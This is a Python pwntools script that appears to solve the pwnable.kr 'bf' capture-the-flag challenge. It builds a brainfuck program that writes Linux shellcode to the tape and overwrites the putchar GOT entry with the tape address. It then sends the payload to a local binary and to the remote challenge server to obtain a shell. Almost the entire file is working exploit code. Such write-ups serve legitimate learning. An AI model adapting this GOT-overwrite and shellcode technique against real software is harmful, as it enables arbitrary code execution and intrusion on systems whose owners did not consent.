import pwn
import code

# stack looks like:
# [start]
# [main]
# [dobrainfuck]
# Couple useful tools:

read_count = 0
write_queue = b''
prog = b''

def next(n=1):
    """ increment the pointer n times"""
    global prog
    prog += b'>' * n

def previous(n):
    """ decrement the pointer n times"""
    global prog
    prog = prog + b'<' * n

def out(n):
    global prog
    prog = prog + b'.' * n

def readn(n):
    """ Read the current byte and increment the pointer n times"""
    global prog
    global read_count
    read_count = read_count + n
    prog += b'.>' * n

def write(byteValues, up=True):
    """ Write the byte array to the current pointer, progresses poitner by len byteValues"""
    global write_queue
    global prog
    write_queue += byteValues
    if up:
        prog = prog + b',>' * len(byteValues)
    else:
        prog = prog + b',<' * len(byteValues)

# Payload construction
#write(b'/bin/sh')
# prog = previous(prog, 7)
# prog = readn(prog, 7) # This is returning /bin/sh like we expect

# get shellcode
shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh())

# write shellcode to begining of tape @0x0804a0a0 (going up) 
tape = 0x0804a0a0
write(shellcode)
previous(len(shellcode))

# progress down to putchar @0x0804a030
putchar = 0x0804a030
previous(tape - putchar)
# overwrite with pointer to shellcode on tape
write(pwn.p32(tape, endian='little'), up=False) # Write the address backwards =)
# Trigger putchar() with '.'
out(1)

# Diagnostics
print("Program size: {} bytes".format(len(prog)))
print("Program:\n{}".format(prog))

# use the local copy to see if we can debug or something.
p = pwn.process('./bf')
p.recvline()
p.recvline()
p.sendline(str(prog))
p.send(write_queue)

# Recover results
results = p.recvall()
code.interact(local=locals())
exit()
# Connect...
host = 'pwnable.kr'
port = 9001
conn = pwn.remote(host, port)
conn.recvline()
conn.recvline()

# Send the program
conn.sendline(str(prog))
conn.send(write_queue)

# Recover results
results = conn.recvall()
code.interact(local=locals())
